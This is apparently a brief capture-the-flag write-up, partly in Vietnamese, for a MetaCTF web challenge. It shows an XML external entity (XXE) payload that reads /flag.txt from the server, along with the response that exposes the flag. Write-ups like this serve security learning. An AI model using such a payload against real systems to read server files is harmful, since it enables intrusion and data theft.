### Leaky Logs - web challenge -300

**Description**

```
Business, INC, the world's premier widget manufacturer, just released their fancy new dashboard, using all the hottest new web technologies from 2010.

This account doesn't seem to have a ton of access. Sucks.

Can you access the flag at /flag.txt?
```

TL,DR: Thử thách khai thác lỗi XXE để truy xuất tệp flag.txt như mô tả thử thách để lấy cờ.

----

Sau khi xác định được điểm cuối để khai thác lỗi XXE, với 1 cái payload khá đơn giản để lấy được flag
![xxe](https://user-images.githubusercontent.com/68894302/145155277-a8a041ec-589b-467c-b887-ff385d7ae5c2.png)


```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]>
<params><query>&test;</query></params>
```

Result:

```
<events filtering_by="MetaCTF{el3m3nt4l_3xtern4lit1e5}&#10;"/>
```

